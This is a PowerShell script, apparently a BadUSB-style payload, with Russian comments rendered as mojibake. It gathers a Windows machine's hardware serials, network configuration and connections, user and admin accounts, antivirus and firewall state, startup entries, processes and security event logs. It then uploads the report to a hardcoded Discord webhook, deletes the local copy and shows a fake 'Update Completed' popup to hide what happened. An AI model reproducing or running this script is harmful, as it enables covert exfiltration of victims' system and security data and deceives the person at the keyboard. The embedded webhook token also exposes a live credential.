# ========== –ù–ê–°–¢–†–û–ô–ö–ò ==========
$webhookUrl = "https://discord.com/api/v10/webhooks/1380240005724770304/ZXWZ-qvvwloOPEwnZqw9wHNi1uuDVK_kmdNGzokReEyjqsHo8m6oDbbjrO2-XBlEctYP"  # üî¥ –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ô!More actions
$reportPath = "$env:USERPROFILE\Desktop\System_Universal_Report.json"
$deleteDelaySeconds = 20

# ========== –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π —Ä–µ–∫–æ–≥–Ω–∞–π–∑ ==========
$report = @{}

# 1. Hardware
$report['Hardware'] = @{
    OS = (Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber)
    ComputerSystem = Get-CimInstance Win32_ComputerSystem | Select-Object Name, Manufacturer, Model, SystemType, TotalPhysicalMemory
    BIOS = Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SMBIOSBIOSVersion, ReleaseDate
    CPU = Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed
    GPU = Get-CimInstance Win32_VideoController | Select-Object Name, DriverVersion
    Disks = Get-PhysicalDisk | Select-Object FriendlyName, SerialNumber, HealthStatus, OperationalStatus, Size
    USBDevices = Get-PnpDevice -Class USB | Select-Object FriendlyName, InstanceId, Status
    Battery = Get-CimInstance Win32_Battery | Select-Object BatteryStatus, EstimatedChargeRemaining
}

# 2. –°–µ—Ç—å
$ipConfigs = Get-NetIPAddress -AddressFamily IPv4, IPv6 | Where-Object { $_.IPAddress -notlike '127.*' }
$adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
$gateways = Get-NetRoute -DestinationPrefix "0.0.0.0/0"
$dnsServers = Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses

$report['Network'] = @{
    IPs = $ipConfigs | Select-Object InterfaceAlias,IPAddress,AddressState
    Adapters = $adapters | Select-Object Name, MacAddress, LinkSpeed
    Gateways = $gateways | Select-Object InterfaceAlias, NextHop
    DNS = $dnsServers
    ActiveTCPConnections = Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess
    ActiveUDPConnections = Get-NetUDPEndpoint | Select-Object LocalAddress,LocalPort,OwningProcess
}

# 3. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
$report['Users'] = @{
    LocalUsers = Get-LocalUser | Select-Object Name, Enabled, LastLogon
    LocalGroups = Get-LocalGroup | Select-Object Name
    Admins = Get-LocalGroupMember -Group 'Administrators' | Select-Object Name, ObjectClass
    FirewallProfiles = Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
    AntivirusProduct = Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName, productState
}

# 4. –ü—Ä–æ—Ü–µ—Å—Å—ã –∏ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞
$report['Processes'] = Get-Process | Select-Object Name, Id, CPU, StartTime -ErrorAction SilentlyContinue
$report['ScheduledTasks'] = Get-ScheduledTask | Select-Object TaskName, TaskPath, State
$startupFolders = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
)
$startupItems = foreach ($path in $startupFolders) {
    if (Test-Path $path) {
        Get-ChildItem $path -Filter *.lnk | Select-Object Name, FullName
    }
}
$registryRunKeys = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
)
$registryStartup = foreach ($key in $registryRunKeys) {
    if (Test-Path $key) {
        Get-ItemProperty $key | ForEach-Object {
            $_.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' } | Select-Object Name, Value
        }
    }
}
$report['StartupItems'] = @{
    StartupFolders = $startupItems
    RegistryRun = $registryStartup
}

# 5. –õ–æ–≥–∏ –∏ —Å–æ–±—ã—Ç–∏—è
$report['EventLogs'] = @{
    Security = Get-WinEvent -LogName Security -MaxEvents 100 | Select-Object TimeCreated, Id, LevelDisplayName, Message
    System = Get-WinEvent -LogName System -MaxEvents 100 | Select-Object TimeCreated, Id, LevelDisplayName, Message
    Application = Get-WinEvent -LogName Application -MaxEvents 100 | Select-Object TimeCreated, Id, LevelDisplayName, Message
}

# 6. –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ - –ø—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤ –Ω–∞ localhost
# –ò—Å–ø–æ–ª—å–∑—É–µ–º netstat —á–µ—Ä–µ–∑ cmd –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
$netstat = netstat -anob | Out-String
$report['OpenPorts'] = $netstat

# ========== –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º ==========
$reportPath = "$env:USERPROFILE\Desktop\System_Universal_Report.json"
$report | ConvertTo-Json -Depth 7 | Out-File -FilePath $reportPath -Encoding utf8

Write-Output "‚úÖ –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –æ—Ç—á–µ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω: $reportPath"


# ========== –û–¢–ü–†–ê–í–ö–ê –í DISCORD ==========
try {
    Add-Type -AssemblyName System.Net.Http
    $fileBytes = [System.IO.File]::ReadAllBytes($reportPath)
    $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")

    $multiPartContent = New-Object System.Net.Http.MultipartFormDataContent
    $multiPartContent.Add($fileContent, "file", "System_Universal_Report.json")

    $httpClient = New-Object System.Net.Http.HttpClient
    $response = $httpClient.PostAsync($webhookUrl, $multiPartContent).Result

    if ($response.IsSuccessStatusCode) {
        Write-Output "üì§ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Discord!"

        Start-Sleep -Seconds $deleteDelaySeconds
        Remove-Item -Path $reportPath -Force
        Write-Output "üóëÔ∏è –õ–æ–∫–∞–ª—å–Ω—ã–π —Ñ–∞–π–ª —É–¥–∞–ª—ë–Ω –ø–æ—Å–ª–µ $deleteDelaySeconds —Å–µ–∫."
    } else {
        Write-Output "‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord: $($response.StatusCode)"
    }
} catch {
    Write-Output "‚ùå –ò—Å–∫–ª—é—á–µ–Ω–∏–µ: $_"
}
# Popup message to signal the payload is done

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
